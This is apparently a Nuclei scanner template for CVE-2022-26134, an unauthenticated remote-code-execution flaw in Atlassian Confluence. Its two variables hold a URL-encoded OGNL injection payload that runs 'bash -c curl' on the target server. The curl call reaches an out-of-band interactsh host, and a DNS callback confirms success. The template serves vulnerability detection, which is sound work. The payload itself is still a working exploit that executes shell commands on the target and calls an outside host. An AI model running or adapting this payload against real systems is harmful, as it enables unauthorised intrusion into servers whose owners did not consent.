id: CVE-2022-26134-rce
info:
  name: Confluence OGNL Remote Code Execution CVE-2022-26134 
  author: psc4re
  severity: critical
  description: CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability in Confluence Server and Data Center
  reference:
    - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
    - https://github.com/jbaines-r7/through_the_wire

  classification:
    cve-id: CVE-2022-26134 
  tags: CVE-2022-26134, OGNLinjection, RCE, confluence

variables:
  a1: "%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22%22%2C%20Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27curl%20"
  a2: "%27%29.start%28%29%22%29%29%7D"


requests:
  - raw:
      - |
        GET /{{a1}}{{Host}}.{{interactsh-url}}{{a2}}/ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable

    extractors:
      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
